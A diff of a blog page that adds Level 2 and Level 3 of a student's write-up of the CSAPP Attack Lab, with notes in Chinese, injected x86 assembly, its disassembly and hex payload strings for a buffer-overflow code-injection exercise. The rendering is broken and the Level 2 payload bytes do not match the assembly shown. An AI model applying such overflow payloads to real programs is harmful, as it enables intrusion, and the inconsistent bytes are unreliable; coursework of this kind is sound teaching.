@@ -30,8 +30,9 @@
 <meta property="og:image" content="https://chenyuhengsjtu.github.io/2023/03/01/CSAPP-AttackLab/image-20230301200029288.png">
 <meta property="og:image" content="https://chenyuhengsjtu.github.io/2023/03/01/CSAPP-AttackLab/image-20230301200620547.png">
 <meta property="og:image" content="https://chenyuhengsjtu.github.io/2023/03/01/CSAPP-AttackLab/image-20230301200735291.png">
+<meta property="og:image" content="https://chenyuhengsjtu.github.io/2023/03/01/CSAPP-AttackLab/image-20230305134834990.png">
 <meta property="article:published_time" content="2023-03-01T11:52:18.000Z">
-<meta property="article:modified_time" content="2023-03-01T14:40:47.498Z">
+<meta property="article:modified_time" content="2023-03-05T05:48:45.102Z">
 <meta property="article:author" content="ChenYuHeng">
 <meta property="article:tag" content="Lab">
 <meta name="twitter:card" content="summary">
@@ -192,10 +193,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-03-01 19:52:18 / Modified: 22:40:47" itemprop="dateCreated datePublished" datetime="2023-03-01T19:52:18+08:00">2023-03-01</time>
+              <time title="Created: 2023-03-01 19:52:18" itemprop="dateCreated datePublished" datetime="2023-03-01T19:52:18+08:00">2023-03-01</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-05 13:48:45" itemprop="dateModified" datetime="2023-03-05T13:48:45+08:00">2023-03-05</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -212,14 +219,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>434</span>
+              <span>1.7k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>1 mins.</span>
+              <span>2 mins.</span>
             </span>
 
         </div>
@@ -254,6 +261,35 @@
 <img src="/2023/03/01/CSAPP-AttackLab/image-20230301200735291.png" class title="This is an example image">
 </li>
 </ul>
+<h3 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h3><ul>
+<li><p>需要跳转到touch2，并且需要正确传递cookie为参数</p>
+</li>
+<li><p>根据x86的函数调用规则，应该把cookie传给rdi</p>
+</li>
+<li><p>所以需要自己插入一些代码</p>
+</li>
+<li><p>思路就是，让buf溢出，将返回地址设置为自己插入的代码的地址，在自己的代码中进行参数传递，然后再跳转到touch2</p>
+</li>
+<li><p>汇编代码</p>
+</li>
+<li><p>```assembly<br>mov $0x5561dcbc, %rdi<br>pushq $0x4018fa<br>retq</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `gcc -c *.s -o *.0 objdump -d *.o &gt; *.d`</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  level3.o：     文件格式 elf64-x86-64</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  Disassembly of section .text:</span><br><span class="line">  </span><br><span class="line">  0000000000000000 &lt;.text&gt;:</span><br><span class="line">     0:	48 c7 c7 bc dc 61 55 	mov    $0x5561dcbc,%rdi</span><br><span class="line">     7:	68 fa 18 40 00       	pushq  $0x4018fa</span><br><span class="line">     c:	c3                   	retq   </span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>注意，需要考虑插入的字节序列的方向，其实在这里就从头往后依次插入就可以了，不需要调整方向</p>
+</li>
+<li><p>One possible solution：</p>
+</li>
+<li><p>```<br>10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 a8 dc 61 55 00 00 00 00 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  &#123;% asset_img image-20230305134244080.png This is an example image %&#125;</span><br><span class="line"></span><br><span class="line">### Level3</span><br><span class="line"></span><br><span class="line">- 同样需要传递参数，只不过这次传递的是一个字符串，所以还需要考虑把字符串放在内存的哪个位置</span><br><span class="line"></span><br><span class="line">- 其实可以放在buf溢出的位置（我这里一次就成功了，不过看网上的其他答案，好像这个字符串必须放在内存位置较高的地方，否则有可能被touch3里面的函数调用覆盖，我直接放在了`buf + 8 + injected code length`的位置</span><br><span class="line"></span><br><span class="line">- 汇编代码：</span><br><span class="line"></span><br><span class="line">- ```assembly</span><br><span class="line">  mov $0x5561dcbc, %rdi</span><br><span class="line">  pushq $0x4018fa</span><br><span class="line">  retq</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>反汇编后：</p>
+</li>
+<li><p>```<br>level3.o：     文件格式 elf64-x86-64</p>
+</li>
+</ul>
+<p>  Disassembly of section .text:</p>
+<p>  0000000000000000 &lt;.text&gt;:<br>     0:    48 c7 c7 bc dc 61 55     mov    $0x5561dcbc,%rdi<br>     7:    68 fa 18 40 00           pushq  $0x4018fa<br>     c:    c3                       retq<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- One possible solution：</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a8 dc 61 55 00 00 00 00 48 c7 c7 b6 dc 61 55 68 fa 18 40 00 c3 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure></p>
+  <img src="/2023/03/01/CSAPP-AttackLab/image-20230305134834990.png" class title="This is an example image">
 
     </div>
 
@@ -334,7 +370,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CSAPP-Attacklab"><span class="nav-number">1.</span> <span class="nav-text">CSAPP Attacklab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.0.1.</span> <span class="nav-text">一些准备工作</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-I-Code-Injection-Attacks"><span class="nav-number">1.1.</span> <span class="nav-text">Part I: Code Injection Attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-1"><span class="nav-number">1.1.1.</span> <span class="nav-text">Level 1</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CSAPP-Attacklab"><span class="nav-number">1.</span> <span class="nav-text">CSAPP Attacklab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.0.1.</span> <span class="nav-text">一些准备工作</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-I-Code-Injection-Attacks"><span class="nav-number">1.1.</span> <span class="nav-text">Part I: Code Injection Attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-1"><span class="nav-number">1.1.1.</span> <span class="nav-text">Level 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level2"><span class="nav-number">1.1.2.</span> <span class="nav-text">Level2</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -407,12 +443,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="Symbols count total">10k</span>
+    <span title="Symbols count total">11k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">9 mins.</span>
+    <span title="Reading time total">10 mins.</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
   </div>
